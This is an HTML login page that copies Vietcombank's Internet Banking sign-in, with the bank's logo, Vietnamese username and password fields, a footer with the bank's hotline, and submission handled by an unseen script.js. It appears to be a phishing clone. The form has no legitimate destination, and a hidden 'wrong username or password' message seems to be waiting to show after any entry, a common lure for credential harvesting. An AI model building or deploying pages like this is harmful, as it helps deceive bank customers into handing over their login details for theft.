<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Vietcombank - Internet Banking</title>
  <link rel="stylesheet" href="style.css">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
</head>
<body>
  <div class="login-box">
    <img src="Logo-Vietcombank.webp" alt="Vietcombank" class="logo">
    <h2>Đăng nhập Internet Banking Vietcombank</h2>
    <form id="loginForm">
      <input type="text" id="user" placeholder="Tên đăng nhập" required>
      <input type="password" id="pass" placeholder="Mật khẩu" required>
      <button type="submit">Đăng nhập</button>
    </form>
    <p id="result" class="hidden">Sai tên đăng nhập hoặc mật khẩu. Vui lòng thử lại.</p>
    <p class="footer">© 2025 Vietcombank | Hotline: 1900 5454 13</p>
  </div>
  <script src="script.js"></script>
</body>
</html>
